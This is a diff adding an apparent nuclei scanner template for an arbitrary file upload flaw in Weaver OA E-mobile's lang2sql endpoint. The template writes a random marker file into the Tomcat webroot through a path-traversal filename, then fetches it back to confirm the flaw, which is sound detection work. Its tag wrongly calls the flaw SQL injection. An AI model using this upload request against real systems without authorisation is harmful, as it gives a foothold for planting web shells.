@@ -1,0 +1,46 @@
+id: poc-yaml-weaver-oa-e-mobile-lang2sql-anyfile-upload
+info:
+  name: 泛微OA E-mobile lang2sql 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_base(4)}}"
+  t2: "{{base64(t1)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/emp/lang2sql?client_type=1&lang_tag=1"
+    headers:
+      Content-Type: multipart/form-data;boundary=----test
+    body: |-
+      ------test
+      Content-Disposition: form-data; name="file"; filename="../../../../appsvr/tomcat/webapps/ROOT/{{t1}}.txt"
+
+      {{t2}}
+      ------test--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "500"
+          - "未知异常"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
